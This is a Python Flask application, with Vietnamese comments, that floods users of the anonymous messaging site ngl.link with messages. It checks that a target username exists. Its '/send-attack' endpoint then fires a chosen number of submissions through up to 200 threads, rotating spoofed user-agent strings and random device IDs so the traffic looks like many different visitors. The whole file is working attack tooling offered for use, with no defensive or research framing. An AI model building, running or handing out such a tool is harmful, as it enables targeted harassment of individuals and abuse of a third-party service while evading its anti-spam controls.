from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import requests
import time
import uuid
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__, template_folder='templates')
CORS(app)

# Danh sách User-Agent đa dạng
USER_AGENTS = [
    # Desktop
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.5735.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",

    # Android
    "Mozilla/5.0 (Linux; Android 9; SM-J600G) AppleWebKit/537.36 Chrome/74.0.3729.157 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-M115F) AppleWebKit/537.36 Chrome/91.0.4472.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 Chrome/73.0.3683.90 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 4) AppleWebKit/537.36 Chrome/97.0.4692.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Samsung Galaxy S21) AppleWebKit/537.36 Chrome/108.0.5359.79 Mobile Safari/537.36",

    # iOS
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 Version/13.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 Version/14.0 Mobile/15A5341f Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 13_6 like Mac OS X) AppleWebKit/605.1.15 Version/13.1 Mobile/15E148 Safari/604.1",

    # Chrome mobile
    "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5) Plus) AppleWebKit/537.36 Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 Chrome/90.0.4430.93 Mobile Safari/537.36",

    # Edge, Opera, Brave
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.172",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124 Safari/537.36 Brave/91.0.4472.124",

    # Samsung browser
    "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 Chrome/76.0.3809.111 Mobile Safari/537.36 SamsungBrowser/10.1",

    # UC Browser
    "Mozilla/5.0 (Linux; U; Android 9; en-US; Redmi Note 7 Pro) AppleWebKit/537.36 UCBrowser/13.3.8.1305 Mobile Safari/537.36",

    # Facebook app (fake)
    "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 Chrome/78.0.3904.108 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/239.0.0.10.109]",

    # TikTok app (fake)
    "com.ss.android.ugc.trill/330 TikTok 23.3.4 rv:233042 (iPhone; iOS 15.5; en_US) Cronet",

    # Random older versions
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 Chrome/67.0.3396.99 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.2; en-us; Nexus 5) AppleWebKit/537.36 Chrome/34.0.1847.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 Chrome/49.0.2623.112 Safari/537.36",

    # Random bots (hợp lệ nhưng gây nhiễu)
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)"
]


@app.route('/')
def index():
    return render_template('index.html')

def send_single_request(username, message, index):
    headers = {
        "Host": "ngl.link",
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
        "origin": "https://ngl.link",
        "referer": f"https://ngl.link/{username}",
        "user-agent": random.choice(USER_AGENTS)
    }

    payload = {
        "username": username,
        "question": message,
        "deviceId": str(uuid.uuid4()),
        "gameSlug": "",
        "referrer": ""
    }

    try:
        response = requests.post("https://ngl.link/api/submit", headers=headers, data=payload)
        print(f"[{index+1}] Status Code: {response.status_code}")
        return {
            'status_code': response.status_code,
            'success': response.status_code == 200,
            'message': f"Đã gửi {index+1}",
            'response': response.text
        }
    except Exception as e:
        print(f"[{index+1}] Error: {e}")
        return {
            'status_code': 0,
            'success': False,
            'message': f"Lỗi ở request {index+1}",
            'response': str(e)
        }

@app.route('/check-username', methods=['GET'])
def check_username():
    username = request.args.get('username')
    if not username:
        return jsonify({'exists': False, 'error': 'Thiếu username'}), 400

    try:
        headers = {
            "user-agent": random.choice(USER_AGENTS)
        }
        response = requests.get(f"https://ngl.link/{username}", headers=headers, timeout=5)
        if response.status_code == 200 and "This page isn't available" not in response.text:
            return jsonify({'exists': True})
        else:
            return jsonify({'exists': False})
    except Exception as e:
        print(f"[ERROR] check_username: {e}")
        return jsonify({'exists': False, 'error': str(e)}), 500

@app.route('/send-attack', methods=['POST'])
def send_attack():
    try:
        data = request.json
        print("[DEBUG] Dữ liệu nhận được:", data)

        username = data.get('username')
        message = data.get('message') or "Hello from bot!"
        count = int(data.get('count', 1))

        if not username or count <= 0:
            return jsonify({'error': 'Thiếu username hoặc count không hợp lệ'}), 400

        headers = {
            "user-agent": random.choice(USER_AGENTS)
        }
        check_response = requests.get(f"https://ngl.link/{username}", headers=headers, timeout=5)
        if check_response.status_code != 200 or "This page isn't available" in check_response.text:
            return jsonify({'error': f'Username {username} không tồn tại trên ngl.link.'}), 400

        results = []
        MAX_THREADS = min(200, count)
        start_time = time.time()

        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = [executor.submit(send_single_request, username, message, i) for i in range(count)]
            for future in as_completed(futures):
                res = future.result()
                results.append(res)

        duration = round(time.time() - start_time, 2)
        return jsonify({'results': results, 'time_taken': f"{duration}s"})

    except Exception as e:
        print("[ERROR] Lỗi tại /send-attack:", e)
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
